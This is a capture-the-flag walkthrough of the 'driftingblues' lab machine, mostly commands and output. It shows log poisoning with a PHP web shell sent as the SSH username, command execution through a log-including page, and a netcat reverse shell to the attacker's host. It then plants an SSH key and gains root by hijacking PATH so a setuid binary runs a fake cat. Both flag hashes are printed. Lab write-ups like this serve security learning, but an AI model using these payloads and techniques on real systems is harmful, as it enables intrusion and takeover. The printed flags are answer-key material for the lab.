## Recon
found 
```
view-source:http://192.168.56.109/adminsfixit.php
Feb 14 18:28:01 driftingblues CRON[757]: pam_unix(cron:session): session opened for user root by (uid=0)
```
when i try to connect on ssh i got these logs
```
Feb 14 18:28:01 driftingblues CRON[757]: pam_unix(cron:session): session closed for user root
Feb 14 18:29:01 driftingblues CRON[763]: pam_unix(cron:session): session opened for user root by (uid=0)
Feb 14 18:29:01 driftingblues CRON[763]: pam_unix(cron:session): session closed for user root
Feb 14 18:30:01 driftingblues CRON[767]: pam_unix(cron:session): session opened for user root by (uid=0)
Feb 14 18:30:01 driftingblues CRON[767]: pam_unix(cron:session): session closed for user root
Feb 14 18:30:19 driftingblues sshd[771]: Invalid user john from 192.168.56.1 port 54206
Feb 14 18:30:19 driftingblues sshd[771]: Connection closed by invalid user john 192.168.56.1 port 54206 [preauth]
Feb 14 18:30:32 driftingblues sshd[773]: Invalid user john from 192.168.56.1 port 42822
Feb 14 18:30:32 driftingblues sshd[773]: Connection closed by invalid user john 192.168.56.1 port 42822 [preauth]
Feb 14 18:30:40 driftingblues sshd[775]: Invalid user john from 192.168.56.1 port 42578
Feb 14 18:30:40 driftingblues sshd[775]: Connection closed by invalid user john 192.168.56.1 port 42578 [preauth]
Feb 14 18:30:42 driftingblues sshd[777]: Invalid user john from 192.168.56.1 port 42586
Feb 14 18:30:42 driftingblues sshd[777]: Connection closed by invalid user john 192.168.56.1 port 42586 [preauth]
Feb 14 18:31:01 driftingblues CRON[779]: pam_unix(cron:session): session opened for user root by (uid=0)
```
I will try this to get a shell
```
<?php system($_GET['cmd']);?>

➜  CTFs_Machines ssh '<?php system($_GET['cmd']);?>'@192.168.56.109
<?php system($_GET[cmd]);?>@192.168.56.109: Permission denied (publickey).
➜  CTFs_Machines
```
Now just
```
view-source:http://192.168.56.109/adminsfixit.php?cmd=id
Feb 14 18:35:38 driftingblues sshd[807]: Invalid user uid=33(www-data) gid=33(www-data) groups=33(www-data)
 from 192.168.56.1 port 39370
Feb 14 18:35:38 driftingblues sshd[807]: Connection closed by invalid user uid=33(www-data) gid=33(www-data) groups=33(www-data)
 192.168.56.1 port 39370 [preauth]
Feb 14 18:35:57 driftingblues sshd[809]: Invalid user uid=33(www-data) gid=33(www-data) groups=33(www-data)
 from 192.168.56.1 port 47160
Feb 14 18:35:57 driftingblues sshd[809]: Connection closed by invalid user uid=33(www-data) gid=33(www-data) groups=33(www-data)
 192.168.56.1 port 47160 [preauth]
Feb 14 18:36:01 driftingblues CRON[811]: pam_unix(cron:session): session opened for user root by (uid=0)
Feb 14 18:35:38 driftingblues sshd[807]: Invalid user total 2028
drwxr-xr-x 8 root root    4096 Jan  4  2021 .
drwxr-xr-x 3 root root    4096 Dec 17  2020 ..
-rw-r--r-- 1 root root      11 Jan  4  2021 MANIFEST.MF
-rw-r--r-- 1 root root      11 Jan  4  2021 Makefile
-rw-r--r-- 1 root root    3642 Feb 14 18:36 adminsfixit.php
-rw-r--r-- 1 root root 2014591 Jan  3  2021 cr.png
drwxr-xr-x 2 root root    4096 Jan  4  2021 drupal
drwxr-xr-x 2 root root    4096 Jan  4  2021 eventadmins
-rw-r--r-- 1 root root    1373 Jan  3  2021 index.html
-rw-r--r-- 1 root root    1314 Jan  4  2021 littlequeenofspades.html
drwxr-xr-x 2 root root    4096 Jan  4  2021 phpmyadmin
drwxr-xr-x 2 root root    4096 Jan  4  2021 privacy
-rw-r--r-- 1 root root      37 Jan  3  2021 robots.txt
drwxr-xr-x 2 root root    4096 Jan  4  2021 secret
-rw-r--r-- 1 root root     347 Jan  3  2021 tickets.html
drwxr-xr-x 2 root root    4096 Jan  4  2021 wp-admin

```
shell
```
view-source:http://192.168.56.109/adminsfixit.php?cmd=nc%20-c%20sh%20192.168.56.1%201337
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@driftingblues:/var/www/html$ ls
ls
MANIFEST.MF	 drupal			   phpmyadmin  tickets.html
Makefile	 eventadmins		   privacy     wp-admin
adminsfixit.php  index.html		   robots.txt
cr.png		 littlequeenofspades.html  secret
www-data@driftingblues:/var/www/html$ export TERM=xterm
www-data@driftingblues:/home/robertj$ ls -la
ls -la
total 16
drwxr-xr-x 3 robertj robertj 4096 Jan  7  2021 .
drwxr-xr-x 4 root    root    4096 Jan  4  2021 ..
drwx---rwx 2 robertj robertj 4096 Jan  4  2021 .ssh
-r-x------ 1 robertj robertj   33 Jan  7  2021 user.txt
www-data@driftingblues:/home/robertj$
www-data@driftingblues:/home/robertj/.ssh$ ls -la
ls -la
total 8
drwx---rwx 2 robertj robertj 4096 Jan  4  2021 .
drwxr-xr-x 3 robertj robertj 4096 Jan  7  2021 ..
www-data@driftingblues:/home/robertj/.ssh$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJIPw/qkeiB+TUJn7Pi" > authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJIPw/qkeiB+TUJn7PiVzxK" > authorized_keys
www-data@driftingblues:/home/robertj/.ssh$ ls
ls
authorized_keys
www-data@driftingblues:/home/robertj/.ssh$
└─# ssh robertj@192.168.56.109
The authenticity of host '192.168.56.109 (192.168.56.109)' can't be established.
ED25519 key fingerprint is SHA256:P07e9iTTwbyQae7lGtYu8i4toAyBfYkXY9/kw/dyv/4.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:14: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.109' (ED25519) to the list of known hosts.
Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
robertj@driftingblues:~$
robertj@driftingblues:~$ cat user.txt
413fc08db21285b1f8abea99040b0280
robertj@driftingblues:~$
```

## Escalation
```
robertj@driftingblues:~$ find / -type f -perm /4000 -ls 2>/dev/null
    31095     20 -r-sr-s---   1 root     operators     16704 Jan  4  2021 /usr/bin/getinfo


robertj@driftingblues:~$ cat /usr/bin/getinfo
ip address
###################
ip a###################
hosts
###################
cat /etc/hosts###################
os inf

```
we have cat inside that program. Let's Break it
```
robertj@driftingblues:/tmp$ mkdir priv
robertj@driftingblues:/tmp$ cd priu
-bash: cd: priu: No such file or directory
robertj@driftingblues:/tmp$ cd priv/q
-bash: cd: priv/q: No such file or directory
robertj@driftingblues:/tmp$ cd priv
robertj@driftingblues:/tmp/priv$ ls
robertj@driftingblues:/tmp/priv$ echo "/bin/bash" > cat
robertj@driftingblues:/tmp/priv$ chmod +x cat
robertj@driftingblues:/tmp/priv$ ls
cat
robertj@driftingblues:/tmp/priv$ export PATH=/tmp/priv/:$PATH
robertj@driftingblues:/tmp/priv$ echo $PATH
/tmp/priv/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
robertj@driftingblues:/tmp/priv$ /usr/bin/getinfo
###################
ip address
###################

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 08:00:27:c8:29:2e brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.109/24 brd 192.168.56.255 scope global dynamic enp0s3
       valid_lft 447sec preferred_lft 447sec
    inet6 fe80::a00:27ff:fec8:292e/64 scope link
       valid_lft forever preferred_lft forever
###################
hosts
###################

root@driftingblues:/tmp/priv# id
uid=0(root) gid=1000(robertj) groups=1000(robertj),1001(operators)
root@driftingblues:/tmp/priv# whoami
root
root@driftingblues:/root# hostnamectl
   Static hostname: driftingblues
         Icon name: computer-vm
           Chassis: vm
        Machine ID: 33186468bf8549eba227e260f774466c
           Boot ID: b34dbc21d68e4c5c9a0777292b1bbf53
    Virtualization: oracle
  Operating System: Debian GNU/Linux 10 (buster)
            Kernel: Linux 4.19.0-13-amd64
      Architecture: x86-64
root@driftingblues:/root#
dfb7f604a22928afba370d819b35ec83```
